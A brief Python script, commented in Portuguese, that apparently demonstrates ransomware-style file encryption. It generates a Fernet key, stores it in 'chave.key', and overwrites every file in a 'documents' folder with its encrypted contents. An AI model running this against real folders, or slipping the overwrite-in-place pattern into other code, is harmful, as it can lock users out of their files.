import os
from cryptography.fernet import Fernet

# O programa criptografará os arquivos localizados em uma pasta chamada documents ignorando as subpastas
key = Fernet.generate_key()

with open("chave.key", "wb") as chave_arquivo:
    chave_arquivo.write(key)

with open("chave.key", "rb") as chave_arquivo:
    key = chave_arquivo.read()

cipher_suite = Fernet(key)

pasta = "documents"

for nome_arquivo in os.listdir(pasta):
    local = os.path.join(pasta, nome_arquivo)


    if os.path.isfile(local):
        with open(local, "rb") as arquivo:
            arquivo_data = arquivo.read()

        encrypted_data = cipher_suite.encrypt(arquivo_data)

        cripted = nome_arquivo
        local_cripted = os.path.join(pasta, cripted)

        with open(local_cripted, "wb") as cripted:
            cripted.write(encrypted_data)